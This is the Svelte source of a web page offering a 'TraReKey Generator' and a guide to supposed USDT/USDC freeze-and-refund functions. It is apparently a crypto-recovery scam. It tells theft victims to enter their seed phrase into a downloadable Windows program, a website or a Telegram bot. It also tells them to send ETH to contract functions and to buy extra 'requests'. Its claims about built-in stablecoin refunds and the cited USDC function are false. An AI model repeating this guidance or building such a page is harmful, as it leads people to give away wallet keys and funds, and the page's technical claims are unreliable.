<script lang="ts">
  import { fade } from "svelte/transition";

  import { _ } from "svelte-i18n";  
  import Contacts  from '$lib/elements/Contacts.svelte';
  import {select_main_nav, brand,
    ETH_USDT,
    ETH_USDC,
    BASE_USDC,
    BNB_USDT,
    BNB_USDC
  } from "$lib/store.js";

  if ($select_main_nav != '/docs')    {
  $select_main_nav = '/docs'
   } 



import { TableOfContents, tocCrawler } from '@skeletonlabs/skeleton';
import Headero from '$lib/elements/HeaderOut.svelte';


let video_01 = "/video/win.mp4";
let video_02 = "/video/manual_01.mp4";
let video_04 = "/video/manual_03.mp4";
let video_05 = "/video/manual_04.mp4";

</script>
<svelte:head> 
  <title> {$brand} | Docs. What is an Unlock Key?  </title>
 </svelte:head>
 
 <Headero/>



<div class=" max-[500px]:block  max-w-screen-md  p-5  font-sans  bg-surface-100 text-black leading-tight">

  <div class=" text-left" >

    <div class="text-sm  mt-2 max-w-md w-fit  px-3 py-2 border border-secondary-400">  
  
      <div class="font-bold mt-1">
        <img src="/windows.svg" class="opacity-80 inline  !w-6  " alt="" />
        TraReKey Generator (PC) </div>
     <span class="text-neutral-900"> Download standalone Windows version  </span>
    <div>
        <a href="download/TraReKey_0.1.0_x64.exe" target="_blank" class="text-primary-500 hover:text-primary-300"> 
      
          TraReKey_0.1.0_x64.exe <span class="opacity-60">[11 Mb]</span>
      </a>
      </div>
      <a href="download/Trarekey_Generator_0.1.0_x64_en-US.msi" target="_blank" class="text-primary-500 hover:text-primary-300"> 
    
        TraReKey_0.1.0_x64_en-US.msi <span class="opacity-60">[5 Mb]</span>
      </a>
     </div>
    

     <h1 class="h2 mt-4 text-error-500 text-2xl font-semibold max-[500px]:text-xl leading-none" id="what-is-unlock-key"> Tokens USDT and USDC include a built-in smart contract mechanism for freezing and recovering tokens.</h1>

     <div class="mt-3 px-3 text-sm italic text-neutral-900 font-sans"> 
     The freezing and recovery mechanism of USDT and USDC tokens plays a key role in implementing anti-money laundering (AML) policies. These features were integrated to ensure compliance with legal regulations and support law enforcement agencies in combating financial crimes.
    <br> This functionality allows for the freezing of tokens in cases of suspicious activities or transactional errors, offering enhanced control over blockchain-based assets. 
</div>





<hr class="mt-3 !border-t-2 !border-primary-500" />





   <h2 class="h2 mt-5 text-2xl font-semibold max-[500px]:text-2xl" id="what-is-unlock-key">Freezing and Recovery Mechanism</h2>
   <h2 class="h2 -mt-1 text-xl  max-[500px]:text-xl" id="what-is-unlock-key">How to Initiate the Token Freezing and Recovery Process?</h2>
   <div class="px-3 text-sm text-neutral-900"> 



    <div class="pt-0 ">
      The freezing and recovery of tokens are automated processes that rely on smart contract functionality. Users can initiate this process through the following steps:
    </div>


    <div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
      1. Submitting a Request </div>
    <div class="pt-0">
      The user submits a request either:
  </div>

    <ul class="list-disc pl-5 pt-1">
      <li class="py-1"><strong>Through a Specialized Interface: </strong>A user-friendly platform designed to guide the process.</li>
      <li class="py-1"><strong>Directly via Blockchain:</strong> 
        Interacting with the smart contract directly using blockchain utilities, such as web3 libraries, 
        etherscan.io, or similar services. (For a manual on how to do this, see below)</li>
     
    </ul>
    <div class="pt-3">
      The request must include:
  </div>

  <ul class="list-disc pl-5 pt-1">
    <li class="py-1"><strong>Transaction Hash (TX hash): </strong>The identifier of the suspicious transaction.</li>
    <li class="py-1"><strong>HEX Key (Trarekey):</strong>  A cryptographic signature that verifies the requestor as the affected party.</li>
   
  </ul>

  <div class="pt-1 font-bold">
    The request must be signed from the address where the funds were stolen or from which the erroneous USDT/USDC transaction originated.
</div>

  

  <div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
    2. Initial Freezing </div>

    <ul class="list-disc pl-5 pt-1">
      <li class="py-1">Upon receiving the request, the appeal smart contract freezes the funds associated with the transaction, preventing further movement.</li>
      <li class="py-1">This action is triggered instantly to minimize the risk of fund relocation. </li>
     
    </ul>





    <div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
      3. AI-Driven Analysis </div>
      <div class="pt-0">
        An AI module assesses the transaction and involved parties, focusing on:
    </div>
  
    <ul class="list-disc pl-5 pt-1">
      <li class="py-1"><strong>Interaction History: </strong>Reviewing prior activities of the wallet addresses.</li>
      <li class="py-1"><strong>Behavioral Patterns: </strong> Identifying deviations from typical usage.</li>
      <li class="py-1"><strong>Transaction Metadata: </strong>  Detecting elements indicative of fraud or suspicious behavior.</li>
     
    </ul>
    <div class="pt-0">
      If criteria for risk are met, the freeze remains in place.
  </div>



  
  <div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
    4. Temporary Delay </div>
    <div class="pt-0">
      A 24 hour delay follows to prevent system abuse, allowing:
  </div>

  <ul class="list-disc pl-5 pt-1">
    <li class="py-1">Collection of further evidence, if required.</li>
    <li class="py-1">Validation through external agencies, if required.</li>
   
   
  </ul>
  <div class="pt-0">
    If criteria for risk are met, the freeze remains in place.
</div>

  
<div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  5. Fund Recovery </div>


<ul class="list-disc pl-5 pt-1">
  <li class="py-1">Once the request is confirmed as valid, the frozen funds are automatically returned to the sender’s wallet after the delay period.</li>
 
</ul>

<div class="mt-2 font-bold text-base " id="what-is-unlock-key"> 
  Key Features</div>


<ul class="list-disc pl-5 pt-1">
  <li class="py-1"><strong>Fast Response: </strong>The mechanism operates instantly, minimizing the risk of token withdrawal by malicious actors.</li>
  <li class="py-1"><strong>Abuse Prevention:</strong> A temporary delay is implemented to eliminate false or fraudulent requests, ensuring system integrity.</li>
  <li class="py-1"><strong>Transparency: </strong>  Every stage of the process, including token freezing and recovery, is recorded on the blockchain, providing full traceability and accountability.</li>
 
</ul>


<div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  Important Notes and Considerations </div>

<ul class="list-decimal pl-5 pt-1">
  <li class="py-1"><strong>Condition for Freezing and Recovery: </strong>
    <br>To initiate the freezing and recovery process, the mistakenly sent or stolen tokens must still reside in the recipient’s wallet. If the tokens have already been transferred to another wallet or exchanged, the mechanism cannot recover them.</li>
  <li class="py-1"><strong>Priority for Large Transactions: </strong> 
    <br>◆  The freezing and recovery mechanism prioritizes large transactions, ensuring swift action in cases with significant financial impact.
    <br>◆  For smaller transactions, the mechanism operates on a secondary or residual basis, activating only when resources are available, and higher-priority cases have been addressed.
  </li>
  
</ul>

<div class="pt-0">
  This approach ensures efficient use of system resources while focusing on transactions with the highest potential risk or loss.
</div>

<div class="pt-3 italic">
  Here's an example of a Solidity function that implements the logic for returning frozen tokens in 
  a USDC smart contract.  [initializeV2_1 (0x2fc81e09)]  (<a href="https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#writeProxyContract#F11" target="_blank" class="text-primary-500 font-bold">Link</a>)
</div>




<img src="/usdc_pic_01.jpg" class=" " alt="" />







</div>


<hr class="mt-3 !border-t-2 !border-primary-500" />



<div class="px-3 text-sm text-neutral-900"> 

<div class="mt-5 font-semibold text-2xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  What is Trarekey (HEX Key)? </div>
  <div class="pt-0">
    Trarekey is a unique identifier generated using a hash function derived from the user's seed phrase. It serves as a secure means of verifying authorization for operations in a smart contract.
Trarekey is attached to requests sent to the smart contract to confirm that the operation is initiated by an authorized user, including:
</div>

<ul class="list-disc pl-5 pt-1">
  <li class="py-1"><strong>Freezing tokens </strong>in cases of suspicious activity.</li>
  <li class="py-1"><strong>Recovering funds </strong> from erroneous or fraudulent transactions.</li>
</ul>


<div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  Trarekey (HEX Key) Generation </div>
  <div class="pt-0">
    The most secure method is generating the Trarekey 
    locally on the user’s device through a dedicated application, such as <a
    href="download/TraReKey_0.1.0_x64.exe"
    class="text-primary-500 font-bold"
  >
    TraReKey Generator (Windows)</a
  >, using a secure hashing algorithm.
    <br>Alternatively, Trarekey can be generated via a website or a 	<a href="https://t.me/TrarekeyBot" class="text-primary-500 font-bold" target="_blank"
    >Telegram bot</a>; however, this approach carries additional risks.
</div>


<div class="my-3">
<video controls width="300">
  <source src={video_01} type="video/mp4" />
  Your browser does not support video.
</video>
</div>

<div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  How Trarekey is Generated </div>
  <div class="pt-0">
    The HEX key is created from the user's seed phrase using a hash function, ensuring secure identity confirmation without exposing sensitive information. The process is as follows:
</div>

<ul class="list-decimal pl-5 pt-1">
  <li class="py-1"><strong>Blockchain and Token Selection: </strong>
    <br>The user selects the blockchain and the token (USDT/USDC) for which the recovery request will be submitted.</li>
  <li class="py-1"><strong>Seed Phrase Input: </strong> 
    <br>The user inputs their seed phrase into the local application or alternative platform.</li>
  <li class="py-1"><strong>Hashing Algorithm Execution: </strong> 
    <br> A secure hashing algorithm generates a unique HEX key based on the seed phrase.</li>
 
</ul>




<div class="mt-2 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
  Security Features of Trarekey</div>


<ul class="list-disc pl-5 pt-1">
  <li class="py-1"><strong>Irreversible Hashing: </strong>
    <br>The Trarekey key is the result of one-way hashing, which means it cannot be reversed to reveal the original seed phrase.</li>
  <li class="py-1"><strong>Protection Against Compromise: </strong> 
    <br>Even if the Trarekey key is exposed, it cannot compromise the user's seed phrase.
    Additionally, all blockchain actions must be signed directly from the wallet associated with the erroneous or compromised transaction involving USDT/USDC tokens.</li>
    <li class="py-1"><strong>Confidentiality: </strong>
    <br>The process of generating and using the HEX key is designed to prevent data leaks. The original seed phrase remains confidential and is never shared or transmitted.</li>
 
    <li class="py-1"><strong>Unique and Non-Replicable:</strong>
      <br>The Trarekey key is unique to each user and can only be used with the user's wallet address, ensuring it cannot be forged or misused by others.</li>

</ul>
<div class="pt-0">
  The Trarekey key is used to sign requests, ensuring both security and authenticity, without the need to share confidential wallet information.
  This robust security design ensures that the Trarekey key maintains the highest level of trust and reliability in operations involving USDT and USDC tokens.
</div>



</div>

<hr class="mt-3 !border-t-2 !border-primary-500" />



    
<h2 class="mt-5 h2 text-xl  text-primary-500" id="manual-enter">
  Links and functions for manual entry of the Trarekey</h2>

<div class="p-2  w-fit text-sm text-neutral-900 mt-3 mb-3 border border-secondary-600"> 
<table class="table-auto font-sans">
  <thead>
    <tr class=" border-b border-secondary-500 text-sm text-secondary-900 ">
      <th>Network & Token</th>
      <th>Function</th>
   
    </tr>
  </thead>
  <tbody>
    <tr class=" border-b border-secondary-500 ">
      <td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
        <a href="https://etherscan.io/address/{$ETH_USDT}#writeContract" 
            class="hover:opacity-75"
        target="_blank">
          USDT (Ethereum Mainnet)     
           <img src="/icon-link.png" class="inline opacity-50 hover:opacity-100  !w-5  " alt="" /></a>
          </td>
      <td class="text-xs p-1">1. _verifyTxAndKey (0xb158845c) 

        <br>2. _xReverseTransactionInit (0xf9b3951a)
      </td>
      
     
    </tr>

    <tr class=" border-b border-secondary-500 ">
      <td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
        <a href="https://etherscan.io/address/{$ETH_USDC}#writeContract" 
            class="hover:opacity-75"
        target="_blank">
          USDC (Ethereum Mainnet)     
           <img src="/icon-link.png" class="inline opacity-50 hover:opacity-100  !w-5  " alt="" /></a>
          </td>
          <td class="text-xs p-1">1. _verifyTxAndKey (0xb158845c) 

            <br>2. _xReverseTransactionInit (0xf9b3951a)
          </td>
 
    </tr>


    
    <tr class=" border-b border-secondary-500 ">
      <td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
        <a href="https://bscscan.com/address/{$BNB_USDT}#writeContract" 
        class="hover:opacity-75"
        target="_blank">
          USDT (BNB Smart Chain)     
           <img src="/icon-link.png" class="inline opacity-50 hover:opacity-100  !w-5  " alt="" /></a>
          </td>
          <td class="text-xs p-1">1. _verifyTxAndKey (0xb158845c) 

            <br>2. _xReverseTransactionInit (0xf9b3951a)
          </td>
 
    </tr>

    <tr class=" border-b border-secondary-500 ">
      <td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
        <a href="https://bscscan.com/address/{$BNB_USDC}#writeContract" 
        class="hover:opacity-75"
        target="_blank">
          USDC (BNB Smart Chain)     
           <img src="/icon-link.png" class="inline opacity-50 hover:opacity-100  !w-5  " alt="" /></a>
          </td>
          <td class="text-xs p-1">1. _verifyTxAndKey (0xb158845c) 

            <br>2. _xReverseTransactionInit (0xf9b3951a)
          </td>
 
    </tr>


    <tr class="  ">
      <td class="w-2/5 !p-1 font-bold text-sm text-primary-500">
        <a href="https://basescan.org/address/{$BASE_USDC}#writeContract" 
            class="hover:opacity-75"
        target="_blank">
          USDC (Base Mainnet)     
           <img src="/icon-link.png" class="inline opacity-50 hover:opacity-100  !w-5  " alt="" /></a>
          </td>
          <td class="text-xs p-1">1. _verifyTxAndKey (0xb158845c) 

            <br>2. _xReverseTransactionInit (0xf9b3951a)
          </td>
 
    </tr>











  </tbody>
</table>
</div>




    <h2 class="pt-5 h2 text-xl max-[500px]:text-base text-secondary-900" id="via-metamask"> Algorithm for Activating the Function via MetaMask</h2>

    <div class="mt-3 px-3 text-sm text-neutral-900"> 

      <div class="my-3">
        <video controls width="800">
          <source src={video_02} type="video/mp4" />
          Your browser does not support video.
        </video>
        </div>
  
      <ul class="list-decimal pl-5 pt-1">
        <li class="py-1"><strong class="text-base">Ensure MetaMask is Set Up</strong><br>
          • Open MetaMask and switch to the Ethereum network (if not already selected).<br>
          • Make sure you have sufficient funds to cover the gas fee (ETH in your balance).<br>
        </li>
        <li class="py-1"><strong class="text-base">Go to the Contract Page</strong><br>
          • Open the contract page on Etherscan.io (Basescan.org, Bscscan.com).<br>
          • Navigate to the "Contract" tab → "Write Contract" section.<br>
          </li>
          <li class="py-1"><strong class="text-base"> Connect MetaMask to Etherscan</strong><br>
          	• Click the "Connect to Web3" button in the "Write Contract" section.<br>
	          • In the pop-up window, select MetaMask and confirm the connection.<br>
            • Make sure that MetaMask displays the address of the wallet from which an erroneous payment was made or funds were lost due to fraudulent actions.<br>
          </li>

          <li class="py-1"><strong class="text-base">  Locate the _verifyTxAndKey Function</strong><br>
            • The input field for request data (e.g., TxHash, HexKey) will become active.<br>
          </li>

          <li class="py-1"><strong class="text-base">  Enter the Function Data</strong><br>
            • Enter a payment amount greater than zero to ensure the transaction is successfully processed by the validator.<br>
            • TxHash: Provide the exact hash of the incorrect or suspicious transaction for accurate identification.<br>
            • HexKey (Trarekey): Enter the Trarekey, generated either online or through a Windows application. This unique key serves as proof of your authorization to submit a valid request for freezing and recovering tokens.
            <br> Double-check the accuracy of the entered information before proceeding.
          </li>

          <li class="py-1"><strong class="text-base"> Submit the Transaction</strong><br>
            • Click the "Write" button next to the function.<br>
            • MetaMask will open a transaction confirmation window.<br>
            • Verify the details:<br>
              &nbsp;&nbsp; ○ Contract Address: Ensure it matches the contract address on Etherscan.<br>
              &nbsp;&nbsp; ○ Gas Fee: Confirm that the fee is acceptable (you can adjust the gas limit if needed).<br>
          Click "Confirm".
          </li>

          <li class="py-1"><strong class="text-base">  Wait for the Transaction to Process</strong><br>
            • After confirmation, the transaction will be sent to the Ethereum network.<br>
            • You can track its status in MetaMask or on Etherscan (via the link in the pop-up window).<br>
          </li>

          <li class="py-1"><strong class="text-base">  Check the Result Within 24 Hours</strong><br>
            • After a successful transaction, verify the validity of your request using the _getVerificationStatus function in the Read Contract section on Etherscan.<br>
            • If the status is confirmed, you can proceed to initiate the _xReverseTransactionInit function.<br>

          </li>

          <div class="my-3">
            <video controls width="800">
              <source src={video_05} type="video/mp4" />
              Your browser does not support video.
            </video>
            </div>

          <li class="py-1"><strong class="text-base">  Activating the Token Refund Function</strong><br>
            • Go to the Read Contract section on Etherscan and select the _xReverseTransactionInit function.<br>
            • Enter a payment amount greater than zero to ensure the transaction is successfully processed by the validator.<br>
            • Provide the validated TxHash.<br>
            Click the Write button next to the function to execute it.

          </li>

          <li class="py-1"><strong class="text-xl text-success-500">  Completion</strong><br>
            <strong class="text-base text-success-500"> 
              Once the transaction is completed, the token refund should occur immediately.
            </strong>

          </li>

      </ul>
    </div>





  
 
  

  
    <h2 class="h2 text-2xl max-[500px]:text-xl pt-3" id="goes-wrong">Troubleshooting: What to Do If Something Goes Wrong</h2>

    <div class="px-3 text-sm text-neutral-900"> 
  
      <ul class="list-disc pl-5 pt-1">
        <li class="py-1"><strong>Application Submission Error</strong><br>
          •  Check the validation status of your request.
          If the application did not pass validation, you will not be able to invoke the refund function.
          Review your submission details and ensure all required information is correct.
        </li>
        <li class="py-1"><strong>Insufficient Gas:</strong><br>
          •  Add more ETH (BNB) to your wallet to cover the gas fees.
Ensure you have enough balance and then retry the transaction.
          </li>
        <li class="py-1">	<strong>Invalid Trarekey (HexKey)</strong> 
          <br> •  Verify that the key was generated correctly and is linked to the wallet address associated with the lost funds or erroneous transaction.
          <br> •  Double-check the following when generating the Trarekey:
          <br> &nbsp;&nbsp; ◆ The correct token is selected (USDC or USDT).
          <br> &nbsp;&nbsp; ◆ The correct blockchain network is chosen, as the validity of the HexKey depends on these parameters.
          </li>

          <li class="py-1">	<strong>Submission Through Etherscan</strong> 
            <br> •  Ensure that the wallet connected to Etherscan matches the one used to generate the Trarekey.
            <br> •  If the wrong wallet is connected, the system will reject the request. Reconnect the correct wallet and try again.
          <br>
          <strong> By following these steps, you can resolve common issues and proceed with your request successfully.</strong> 
          
            </li>


      </ul>
    </div>



    <hr class="mt-3 !border-t-2 !border-primary-500" />

    

    <div class="mt-5 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
      Request Limits and Pricing Policy</div>

  
    <ul class="list-decimal pl-5 pt-1">
      <li class="py-1"><strong>Free Transactions: </strong>
      <br> ◆ Each user is entitled to three free freeze-and-recovery requests. These can be used to address cases of accidental or fraudulent transactions without incurring any cost.
      </li>
      <li class="py-1"><strong>Paid Requests: </strong> 
        <br>
        ◆  Once the free requests are exhausted, users must purchase additional request slots to continue using the mechanism.
      <br>
      ◆ This measure is designed to prevent abuse of the freeze-and-recovery system and maintain its integrity.
      </li>

      <li class="py-1"><strong>Pricing Structure for Additional Requests: </strong> 
      <br>
      ◆ 1 Request: 0.05 ETH
      <br>
      ◆ 5 Requests: 0.15 ETH
      <br>
      ◆ 10 Requests: 0.25 ETH
      </li>
    </ul>
    <div class="pt-0">
      This tiered pricing structure allows users flexibility based on their needs while ensuring the mechanism remains accessible and sustainable for the broader ecosystem.
  </div>



  <div class="mt-5 font-semibold text-xl  max-[500px]:text-xl" id="what-is-unlock-key"> 
    How to pay for additional requests?</div>
  

    <div class="my-3">
      <video controls width="800">
        <source src={video_04} type="video/mp4" />
        Your browser does not support video.
      </video>
      </div>

        </div>

<br><br><br><br><br><br>

        

      </div>
  





 <Contacts/>

 <br><br>
  



